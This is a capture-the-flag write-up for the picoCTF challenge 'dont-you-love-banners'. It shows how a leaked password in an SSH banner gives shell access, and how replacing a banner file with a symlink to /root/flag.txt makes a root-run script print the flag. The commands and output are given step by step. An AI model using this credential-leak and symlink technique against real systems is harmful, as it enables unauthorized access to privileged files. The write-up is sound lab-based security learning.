# dont-you-love-banners
Challenge Description:
> Can you abuse the banner?

CTF: <b>picoCTF</b> (picoGym)<br>Difficulty: <b>Medium</b>

<b>[Jump to solution](#solution)</b>

## Hints
Here are the hints provided by the challenge author.
<details>
<summary>Hint 1</summary>

> Do you know about symlinks?
</details>
<details>
<summary>Hint 2</summary>

> Maybe some small password cracking or guessing
</details>

(no idea what hint 2 is referring to)

## Procedure
When starting the challenge instance we get a target to connect to on two different ports. When connecting to the first port, we get a password of some kind.
```
$ nc tethys.picoctf.net 59447
SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234

Protocol mismatch.
```
When connecting to the second port, we get some kind of quiz. Using the password leaked from the first connection, we can spawn a shell by answering the questions correctly.
```
$ nc tethys.picoctf.net 58052
*************************************
**************WELCOME****************
*************************************

what is the password? 
My_Passw@rd_@1234
What is the top cyber security conference in the world?
DEFCON
the first hacker ever was known for phreaking(making free phone calls), who was it?
John Draper
player@challenge:~$
```
We find two files in the home directory - `banner` and `text`. The text file is useless, but the banner prints the banner we saw when initially connecting.
```
player@challenge:~$ ls -a
ls -a
.  ..  .bash_logout  .bashrc  .profile  banner  text
player@challenge:~$ cat banner
cat banner
*************************************
**************WELCOME****************
*************************************
```

The challenge description (after starting an instance) tells you to find the flag in the `/root` directory, so we can start searching there (since we have permissions to change into it).
```
player@challenge:~$ cd /root
cd /root
player@challenge:/root$ ls -l
ls -l
total 8
-rwx------ 1 root root   46 Mar 12  2024 flag.txt
-rw-r--r-- 1 root root 1317 Feb  7  2024 script.py
```
In the root directory we see the flag file as well as a script. We can't read the flag file directly, so let's see what this Python script is all about.
```
player@challenge:/root$ cat script.py
cat script.py

import os
import pty

incorrect_ans_reply = "Lol, good try, try again and good luck\n"

if __name__ == "__main__":
    try:
      with open("/home/player/banner", "r") as f:
        print(f.read())
    except:
      print("*********************************************")
      print("***************DEFAULT BANNER****************")
      print("*Please supply banner in /home/player/banner*")
      print("*********************************************")
```
It seems like the Python script opens a file `/home/player/banner` and prints its contents. If this script is run with root permissions, we can replace `/home/player/banner` with a symlink to `/root/flag.txt`.
```
player@challenge:/root$ cd ~
cd ~
player@challenge:~$ rm banner
rm banner
player@challenge:~$ ln -s /root/flag.txt banner
ln -s /root/flag.txt banner
```
Upon reconnecting to the remote machine, we get the flag printed as the banner.
```
$ nc tethys.picoctf.net 58052
hammy{u win - hammy}
```

## Solution
1. Leak the password from the first open port on the machine.
```
$ nc tethys.picoctf.net 59447
SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234

Protocol mismatch.
```
2. Connect to the second open port and anmswer the questions with:
    - My_Passw@rd_@1234
    - DEFCON
    - John
3. Remove the `banner` file in the home directory.
    - `rm banner`
4. Create a link to `/root/flag.txt` named `banner` in the home directory.
    - `ln -s /root/flag.txt banner`
5. Reconnect to the second open port.

## Key Takeaways
Before rereading the challenge description I assumed that `/root` was inaccessible. Maybe some other challenges won't adhere to this assumption, and also won't tell me to look there...